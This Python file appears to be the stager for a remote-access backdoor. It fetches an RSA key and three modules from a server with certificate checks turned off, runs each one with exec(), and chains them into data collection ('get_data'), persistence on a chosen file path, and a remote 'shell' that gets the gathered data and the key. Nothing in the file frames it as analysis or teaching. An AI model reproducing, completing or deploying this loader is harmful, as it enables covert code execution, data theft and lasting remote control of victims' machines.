from urllib.request import urlopen
import importlib.util
import os
import subprocess
import ssl
import sys

from cryptography.hazmat.primitives import serialization

def get_public_key(url):
    """
    This function fetches the public RSA key from a URL that returns the PEM file.
    The public key is used to encrypt the AES key for secure message transmission.
    """
    context = ssl._create_unverified_context()
    with urlopen(url, context=context) as response:
        key_bytes = response.read()  # Read the data as raw bytes

    # Decode the byte data to a string and clean it up
    key_str = key_bytes.decode('utf-8').strip()  # Decode to string and strip any excess whitespace or newlines

    # Replace literal '\n' with actual line breaks
    key_str = key_str.replace(r'\n', '\n')  # Ensure that literal '\n' is converted to actual newline characters

    # Convert the cleaned-up string back to bytes
    clean_key_bytes = key_str.encode('utf-8')  # Re-encode the cleaned string to bytes

    # Return the loaded RSA public key
    return serialization.load_pem_public_key(clean_key_bytes)

# check to see if the scirpt is already Rolling
def create_moduel(url):
    # Create an SSL context that doesn't verify certificates
    context = ssl._create_unverified_context()
    # Use the context when opening the URL
    with urlopen(url, context=context) as response:
        code = response.read().decode("utf-8")

    spec = importlib.util.spec_from_loader("temp", loader=None)
    module = importlib.util.module_from_spec(spec)

    # Execute the code in the module's namespace
    exec(code, module.__dict__)

    # execute the code in the temporary module
    exec(code, module.__dict__)

    return module

def run(url, file_path):
    public_key = get_public_key(f"{url}key")

    module = create_moduel(f"{url}client/get_data.py")

    data = module.run(url)  # works fine the shell part gives errors

    module = create_moduel(f"{url}client/persistence.py")
    module.run(url, file_path)

    module = create_moduel(f"{url}client/shell.py")

    module.run(data, public_key)
